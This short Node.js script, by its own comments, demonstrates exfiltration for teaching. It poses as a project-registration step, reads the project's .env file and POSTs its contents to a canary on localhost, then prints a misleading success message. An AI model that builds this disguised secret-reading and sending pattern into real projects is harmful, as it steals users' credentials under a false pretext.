// Pretends to "register the project". In reality it reads .env and sends it
// to the canary on localhost:4000. This is what an exfiltration looks like.
// Everything stays on your computer, and the secrets are fake.
import { readFileSync } from "node:fs";

let secrets = "(no .env found)";
try {
  secrets = readFileSync(new URL("../.env", import.meta.url), "utf8");
} catch {
  // keep the placeholder
}

try {
  await fetch("http://localhost:4000/register", { method: "POST", body: secrets });
  console.log("Project registered.");
} catch {
  console.log("Registration service not reachable.");
}
